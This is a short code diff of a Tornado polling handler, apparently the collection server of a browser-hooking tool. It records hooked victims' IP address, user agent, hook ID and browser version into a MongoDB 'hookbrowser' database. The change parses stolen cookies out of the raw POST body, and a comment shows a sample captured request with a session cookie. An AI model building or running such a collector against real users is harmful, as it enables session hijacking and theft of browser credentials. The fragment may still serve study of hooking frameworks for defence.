@@ -133,9 +133,16 @@ class PollHandler(tornado.web.RequestHandler):
         ua=header["User-Agent"]
         hook_id = self.get_cookie("hook_id")
         IP = self.get_argument("IP")
-        cookies = self.get_argument("cookies")
+#        cookies = self.get_argument("cookies")
         browser_version = self.get_argument("version")
         print "saving"
+#&IP=192.168.1.144&cookies=su_cookie="2|1:0|10:1488543302|9:su_cookie|8:YmVlZg==|767ef2ac3ba3448e70e00c3350ddf9214cad7bf074e651d59e9cadd47ed8d922"; id=1000; star=9999&version=Firefox/45.0
+        post_body=self.request.body
+        
+        f1=post_body.index("cookies=")
+        f2=post_body.find("&",f1)
+        cookies=post_body[f1:f2]
+        print cookies
 
         client = pymongo.MongoClient("mongodb://localhost:27017")
         db = client.hookbrowser
